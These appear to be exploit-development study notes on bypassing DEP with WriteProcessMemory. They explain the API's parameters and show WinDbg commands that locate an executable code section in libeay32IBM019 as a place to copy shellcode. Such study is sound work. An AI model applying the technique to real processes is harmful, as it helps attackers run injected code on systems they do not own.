# Bypassing DEP with WriteProcessMemory

## WriteProcessMemory function prototype

```
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```

**hProcess -** is a handle to the process we want to interact with. Since we want to perform a copy operation inside the current process, we'll supply a _pseudo handle_. The pseudo handle is a special constant currently set to `-1`

**lpBaseAddress** - is the absolute memory address inside the code section where we want our shellcode to be copied. In principle, this address could be anywhere inside the code section because it has the correct memory protections, but overwriting existing code could cause the application to crash.

## Find Offset to the code section

```
0:077> dd libeay32IBM019 + 3c L1
031f003c  00000108

0:077> dd libeay32IBM019 + 108 + 2c L1
031f0134  00001000

0:077> ? libeay32IBM019 + 1000
Evaluate expression: 52367360 = 031f1000
```

## Collect information about the code section

```
0:077> !address 031f1000

Usage:                  Image
Base Address:           031f1000
End Address:            03283000
Region Size:            00092000 ( 584.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000020          PAGE_EXECUTE_READ
Type:                   01000000          MEM_IMAGE
Allocation Base:        031f0000
Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
...
```

